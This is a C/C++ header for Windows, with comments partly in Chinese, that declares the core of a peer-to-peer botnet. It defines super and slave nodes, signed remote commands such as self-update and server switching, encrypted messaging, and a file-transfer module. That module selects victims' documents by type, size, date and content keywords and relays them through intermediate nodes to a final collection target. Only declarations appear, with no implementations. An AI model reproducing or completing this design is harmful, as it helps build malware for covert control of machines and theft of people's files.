#ifndef P2P_BOT_H
#define P2P_BOT_H

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _SILENCE_CXX17_CODECVT_HEADER_DEPRECATION_WARNING

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <bcrypt.h>
#include <wincrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <process.h>
#include <objbase.h>
#include <chrono>
#include <vector>
#include <string>
#include <map>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "ole32.lib")

// 基本常量定义
#define MAX_PACKET_SIZE 1400
#define MAX_NODES 1000
#define MAX_COMMAND_SIZE 1024
#define MAX_CHUNK_SIZE 512  // 减小分片大小以适应头部
#define MAX_HOPS 5

// Binary sizes (bytes)
#define NODE_ID_BINARY_SIZE 32
#define PUBLIC_KEY_BINARY_SIZE 32
#define PRIVATE_KEY_BINARY_SIZE 32
#define SIGNATURE_SIZE 64
#define HASH_SIZE 32

// String sizes (hex format)
#define NODE_ID_STRING_SIZE 64
#define KEY_STRING_SIZE 64
#define SIGNATURE_STRING_SIZE 128

// Data type macros
#define PUBLIC_KEY_SIZE PUBLIC_KEY_BINARY_SIZE
#define PRIVATE_KEY_SIZE PRIVATE_KEY_BINARY_SIZE
#define NODE_ID_SIZE NODE_ID_BINARY_SIZE

// Network parameters
#define DEFAULT_PORT 33445
#define HEARTBEAT_INTERVAL 60
#define DISCOVERY_INTERVAL 30
#define COMMAND_TIMEOUT 300  // 5 minutes timeout

// Enum types
typedef enum {
    NODE_TYPE_SUPER = 0,
    NODE_TYPE_SLAVE = 1
} NODE_TYPE;

typedef enum {
    NODE_STATE_OFFLINE = 0,
    NODE_STATE_ONLINE = 1
} NODE_STATE;

// 统一消息类型枚举
typedef enum {
    MSG_TYPE_PING = 1,
    MSG_TYPE_PONG = 2,
    MSG_TYPE_COMMAND = 3,
    MSG_TYPE_RESPONSE = 4,
    MSG_TYPE_DISCOVERY = 5,
    MSG_TYPE_ELECTION = 6,
    MSG_TYPE_HEARTBEAT = 7,
    // 文件传输相关消息类型
    FILE_TRANSFER_REQUEST = 8,
    FILE_TRANSFER_RESPONSE = 9,
    FILE_CHUNK = 10,
    FILE_TRANSFER_COMPLETE = 11
} MESSAGE_TYPE;

// 网络连接类型
typedef enum {
    NET_TYPE_LAN_ONLY = 0,     // 仅局域网
    NET_TYPE_WAN_ONLY = 1,     // 仅外网  
    NET_TYPE_BOTH = 2,         // 两者均可
    NET_TYPE_NONE = 3          // 无网络连接
} NETWORK_TYPE;

// 网络状态消息
typedef struct {
    NETWORK_TYPE net_type;
    char public_ip[16];        // 公网IP（如果可连接外网）
    unsigned long long timestamp;
} NETWORK_STATUS;

// 文件传输命令
typedef struct {
    char file_pattern[256];        // 文件模式
    char target_path[256];        // 目标路径
    int chunk_size;               // 分片大小
    char relay_node_id[NODE_ID_STRING_SIZE + 1]; // 中继节点ID
    char final_target_id[NODE_ID_STRING_SIZE + 1]; // 最终目标节点ID

    // 新增精准控制字段
    char file_types[256];         // 文件类型过滤 *.doc,*.pdf,*.xlsx等
    unsigned long long min_size;   // 最小文件大小
    unsigned long long max_size;   // 最大文件大小
    char directory_filter[256];   // 目录过滤（包含/排除）
    int max_file_count;           // 最大文件数量
    char time_range[64];          // 时间范围 "2024-01-01:2024-12-31"
    char content_keywords[512];   // 内容关键词
    int include_subdirs;          // 是否包含子目录
    char priority_files[512];     // 优先文件列表
} FILE_TRANSFER_CMD;

// 文件传输消息头（简化版，确保大小可控）
typedef struct {
    char file_id[33];          // 文件唯一ID（缩短）
    char file_name[128];       // 文件名（缩短）
    unsigned long long file_size;  // 文件大小（统一使用64位）
    unsigned short total_chunks; // 总片数
    unsigned short chunk_index;  // 当前片索引
    unsigned short chunk_size;   // 当前片大小
    char sender_id[33];         // 发送者ID（缩短）
    char recipient_id[33];      // 接收者ID（缩短）
} FILE_CHUNK_HEADER;

// 增强的文件传输头（更紧凑的设计）
typedef struct {
    FILE_CHUNK_HEADER base_header;     // 基础头信息 - 修复：改为base_header

    // 增强信息（精简）
    char final_target_id[33];         // 最终目标ID
    char original_sender_id[33];      // 原始发送者ID
    unsigned char hop_count;          // 跳数

    // 过滤参数（精简）
    char file_types[32];              // 文件类型
    unsigned int min_size;            // 最小大小
    unsigned int max_size;            // 最大大小
    unsigned short max_files;         // 最大文件数
} ENHANCED_FILE_HEADER;

// 验证结构体大小（放宽限制）
static_assert(sizeof(ENHANCED_FILE_HEADER) <= 400, "ENHANCED_FILE_HEADER too large");
static_assert(sizeof(ENHANCED_FILE_HEADER) + MAX_CHUNK_SIZE <= MAX_PACKET_SIZE - 100,
    "ENHANCED_FILE_HEADER plus data may exceed buffer size");

// 文件传输会话结构（完全初始化）
typedef struct FILE_TRANSFER_SESSION {
    char file_id[37];
    char file_name[256];
    unsigned long long file_size;
    unsigned int total_chunks;
    unsigned int received_chunks;
    std::vector<std::vector<unsigned char>> chunks;
    time_t last_activity;
    char original_sender_id[NODE_ID_STRING_SIZE + 1];
    char final_target_id[NODE_ID_STRING_SIZE + 1];
    int hop_count;
    std::vector<std::string> path_taken;

    // 构造函数确保完全初始化
    FILE_TRANSFER_SESSION() :
        file_size(0),
        total_chunks(0),
        received_chunks(0),
        last_activity(0),
        hop_count(0)
    {
        memset(file_id, 0, sizeof(file_id));
        memset(file_name, 0, sizeof(file_name));
        memset(original_sender_id, 0, sizeof(original_sender_id));
        memset(final_target_id, 0, sizeof(final_target_id));
        chunks.clear();
        path_taken.clear();
    }
} FILE_TRANSFER_SESSION;

// Command data structure (for signing)
typedef struct {
    char command[64];
    char sender_pub_key[KEY_STRING_SIZE + 1];
    unsigned long long timestamp;
    unsigned int arg_count;
    char args[10][128];
} COMMAND_DATA;

// Command message structure
typedef struct {
    COMMAND_DATA cmd_data;  // Data part for signing
    char signature[SIGNATURE_STRING_SIZE + 1];
} COMMAND_MESSAGE;

// 节点信息结构
typedef struct {
    char node_id[NODE_ID_STRING_SIZE + 1];
    char public_key[KEY_STRING_SIZE + 1];
    char ip_address[16];
    unsigned short port;
    NODE_TYPE node_type;
    NODE_STATE state;
    unsigned long long last_seen;
} P2P_NODE;

// 网络消息结构
typedef struct {
    char message_id[37];
    char sender_id[NODE_ID_STRING_SIZE + 1];
    char recipient_id[NODE_ID_STRING_SIZE + 1];
    MESSAGE_TYPE message_type;
    unsigned long long timestamp;
    unsigned int data_size;
    unsigned char encrypted;
    unsigned char data[MAX_PACKET_SIZE - 100];
} NETWORK_MESSAGE;

// 命令结果结构
typedef struct {
    unsigned char status;
    char response[1024];
    unsigned int execution_time;
    unsigned long long timestamp;
} COMMAND_RESULT;

// 加密上下文结构
typedef struct {
    BCRYPT_ALG_HANDLE hAesAlg;
    BCRYPT_KEY_HANDLE hKey;
    unsigned char key[32];
    unsigned char iv[16];
} CRYPTO_CONTEXT;

// P2P核心结构
typedef struct {
    char node_id[NODE_ID_STRING_SIZE + 1];
    char public_key[KEY_STRING_SIZE + 1];
    char private_key[KEY_STRING_SIZE + 1];
    NODE_TYPE current_type;
    NODE_STATE current_state;
    SOCKET listen_socket;
    unsigned short listen_port;
    CRYPTO_CONTEXT crypto_ctx;
    int running;
} P2P_CORE;

// 命令处理器结构
typedef struct {
    P2P_CORE* p2p_core;
    HANDLE command_thread;
    CRITICAL_SECTION command_cs;
    int running;
} COMMAND_HANDLER;

typedef int (*COMMAND_FUNC)(COMMAND_MESSAGE* cmd, COMMAND_RESULT* result);

// 全局变量声明（在cpp文件中定义）
extern P2P_CORE g_p2p_core;
extern COMMAND_HANDLER g_command_handler;
extern CRITICAL_SECTION g_nodes_cs;
extern P2P_NODE g_known_nodes[MAX_NODES];
extern unsigned int g_node_count;
extern volatile int g_running;
extern volatile int g_restart_count;
extern const int MAX_RESTART_ATTEMPTS;

// Function declarations
int get_local_ip(char* ip_buffer);
int calculate_broadcast_address(const char* local_ip, const char* subnet_mask, char* broadcast_ip);
void generate_node_id(char* node_id);
void generate_message_id(char* message_id);
unsigned long long get_timestamp();
void hex_encode(const unsigned char* data, unsigned int size, char* output);
int hex_decode(const char* hex, unsigned char* data, unsigned int max_size);

int crypto_init(CRYPTO_CONTEXT* ctx);
void crypto_cleanup(CRYPTO_CONTEXT* ctx);
int crypto_encrypt(CRYPTO_CONTEXT* ctx, const unsigned char* plaintext, unsigned int plaintext_size,
    unsigned char* ciphertext, unsigned int* ciphertext_size);
int crypto_decrypt(CRYPTO_CONTEXT* ctx, const unsigned char* ciphertext, unsigned int ciphertext_size,
    unsigned char* plaintext, unsigned int* plaintext_size);
int crypto_generate_keypair(unsigned char* public_key, unsigned char* private_key);
int crypto_sign(const unsigned char* private_key, const unsigned char* data, unsigned int data_size,
    unsigned char* signature);
int crypto_verify(const unsigned char* public_key, const unsigned char* data, unsigned int data_size,
    const unsigned char* signature);

int p2p_initialize(P2P_CORE* core, NODE_TYPE node_type, unsigned short port);
void p2p_cleanup(P2P_CORE* core);
int p2p_start_network(P2P_CORE* core);
void p2p_stop_network(P2P_CORE* core);
int p2p_broadcast_message(P2P_CORE* core, const NETWORK_MESSAGE* msg);
void p2p_handle_message(P2P_CORE* core, const NETWORK_MESSAGE* msg, struct sockaddr_in* from_addr);
void p2p_handle_ping(P2P_CORE* core, const NETWORK_MESSAGE* msg, struct sockaddr_in* from_addr);
void p2p_handle_discovery(P2P_CORE* core, const NETWORK_MESSAGE* msg, struct sockaddr_in* from_addr);
int p2p_can_become_super_node(const P2P_CORE* core);
int p2p_promote_to_super_node(P2P_CORE* core);

int command_handler_init(COMMAND_HANDLER* handler, P2P_CORE* p2p_core);
void command_handler_cleanup(COMMAND_HANDLER* handler);
int command_handler_start(COMMAND_HANDLER* handler);
void command_handler_stop(COMMAND_HANDLER* handler);
int command_handler_process_message(COMMAND_HANDLER* handler, const NETWORK_MESSAGE* msg);
int command_handler_send_response(COMMAND_HANDLER* handler, const char* recipient_id, const COMMAND_RESULT* result);

// 命令处理函数声明
int handle_update_servers(COMMAND_MESSAGE* cmd, COMMAND_RESULT* result);
int handle_switch_server(COMMAND_MESSAGE* cmd, COMMAND_RESULT* result);
int handle_self_update(COMMAND_MESSAGE* cmd, COMMAND_RESULT* result);
int handle_get_info(COMMAND_MESSAGE* cmd, COMMAND_RESULT* result);

int network_detect_connection_type(NETWORK_TYPE* net_type, char* public_ip);
void network_broadcast_status(P2P_CORE* core);
void p2p_handle_network_status(P2P_CORE* core, const NETWORK_MESSAGE* msg);
int network_status_start(P2P_CORE* core);

// 文件传输模块函数声明
int file_transfer_init();
void file_transfer_cleanup();
int file_transfer_handle_command(COMMAND_MESSAGE* cmd, COMMAND_RESULT* result);
int file_transfer_send_file(P2P_CORE* core, const char* file_pattern, const char* relay_node_id, int chunk_size);
void p2p_handle_file_transfer(P2P_CORE* core, const NETWORK_MESSAGE* msg);
int file_transfer_relay_file(P2P_CORE* core, const FILE_CHUNK_HEADER* header, const unsigned char* data);
void file_transfer_cleanup_sessions();
int file_transfer_start(P2P_CORE* core);
void file_transfer_stop();

// 线程函数声明
unsigned __stdcall network_thread(void* param);
unsigned __stdcall discovery_thread(void* param);
unsigned __stdcall network_status_thread(void* param);
unsigned __stdcall file_transfer_cleanup_thread(void* param);
unsigned __stdcall command_thread(void* param);

// 新增的文件传输函数声明
int file_transfer_send_file_enhanced(P2P_CORE* core, const FILE_TRANSFER_CMD* cmd, const char* original_sender);
int file_transfer_relay_file_enhanced(P2P_CORE* core, const ENHANCED_FILE_HEADER* header, const unsigned char* data, unsigned int data_size);
int forward_file_to_final_target(P2P_CORE* core, const char* file_path, FILE_TRANSFER_SESSION* session);
int file_transfer_send_file_with_target_enhanced(P2P_CORE* core, const char* file_path,
    const char* relay_node_id, const char* final_target_id, int chunk_size,
    const char* original_sender, int hop_count);

// 简化的超级节点发现接口
int supernode_discovery_init(P2P_CORE* core);
void supernode_discovery_cleanup();
void supernode_discovery_on_network_change(NETWORK_TYPE net_type, const char* public_ip);
int supernode_discovery_handle_message(const NETWORK_MESSAGE* msg);

// 辅助函数声明
static inline void set_file_size(ENHANCED_FILE_HEADER* header, unsigned long long size) {
    if (header) {
        header->base_header.file_size = size;
    }
}

static inline unsigned long long get_file_size(const ENHANCED_FILE_HEADER* header) {
    if (!header) return 0;
    return header->base_header.file_size;
}

#endif // P2P_BOT_H